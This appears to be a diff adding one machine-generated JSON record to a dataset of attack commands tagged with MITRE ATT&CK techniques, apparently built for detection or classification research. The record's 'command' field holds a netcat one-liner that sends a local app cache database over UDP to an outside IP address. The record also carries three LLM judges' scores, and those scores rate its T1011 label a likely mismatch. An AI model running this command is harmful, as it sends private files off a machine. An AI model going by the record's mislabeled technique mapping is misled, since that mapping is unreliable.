@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
+  "explanation": "Sends a file via UDP bound to the Bluetooth PAN address, leveraging a non-primary medium consistent with T1011.",
+  "rationale_steps": [
+    "Resolve Bluetooth PAN IP using networksetup",
+    "Bind UDP socket to that IP with netcat",
+    "Transmit data to a non-standard UDP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-9b5bbd03",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid macOS nc flags (-u, -s), correct command substitution, and proper input redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "It sends data over a Bluetooth PAN network interface via UDP (network exfiltration), not via a removable physical medium as described by T1011 Exfiltration Over Physical Medium.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:27:26.479760Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, correct use of command substitution, proper awk syntax, and appropriate file path escaping.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration by sending data over a network connection bound to the Bluetooth interface, this is not truly exfiltration over physical medium as described in T1011 which requires data transfer onto physical storage devices that are physically removed.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:27:29.665722Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, proper command substitution, correct piping, and accurate file path escaping for all components.",
+        "semantic_score": 1,
+        "semantic_justification": "The command describes sending data over a network medium (UDP via Bluetooth), which fundamentally contradicts the definition of MITRE ATT&CK T1011 'Exfiltration Over Physical Medium', which involves physically transporting a data-laden medium.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:27:41.227203Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
